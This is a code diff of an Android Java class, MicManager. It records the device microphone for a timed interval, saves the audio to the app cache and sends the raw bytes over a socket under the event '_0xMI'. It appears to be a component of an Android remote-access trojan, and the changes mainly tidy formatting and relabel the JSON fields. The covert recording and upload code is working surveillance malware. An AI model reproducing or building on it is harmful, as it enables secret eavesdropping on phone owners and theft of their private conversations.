@@ -14,7 +14,7 @@ import java.io.IOException;
 import java.util.Timer;
 import java.util.TimerTask;
 
-public  class MicManager {
+public class MicManager {
 
 
     static MediaRecorder recorder;
@@ -29,7 +29,7 @@ public  class MicManager {
         //Creating file
         File dir = MainService.getContextOfApplication().getCacheDir();
         try {
-            Log.e("DIRR" , dir.getAbsolutePath());
+            Log.e("DIRR", dir.getAbsolutePath());
             audiofile = File.createTempFile("sound", ".mp3", dir);
         } catch (IOException e) {
             Log.e(TAG, "external storage access error");
@@ -58,10 +58,10 @@ public  class MicManager {
             }
         };
 
-        new Timer().schedule(stopRecording, sec*1000);
+        new Timer().schedule(stopRecording, sec * 1000);
     }
 
-    private static void sendVoice(File file){
+    private static void sendVoice(File file) {
 
         int size = (int) file.length();
         byte[] data = new byte[size];
@@ -69,10 +69,11 @@ public  class MicManager {
             BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
             buf.read(data, 0, data.length);
             JSONObject object = new JSONObject();
-            object.put("file",true);
-            object.put("name",file.getName());
-            object.put("buffer" , data);
-            IOSocket.getInstance().getIoSocket().send("_0xMI" , object);
+            object.put("type", "voice");
+            object.put("path", "Voice Recorder");
+            object.put("name", file.getName());
+            object.put("buffer", data);
+            IOSocket.getInstance().getIoSocket().send("_0xMI", object);
             buf.close();
         } catch (FileNotFoundException e) {
             e.printStackTrace();
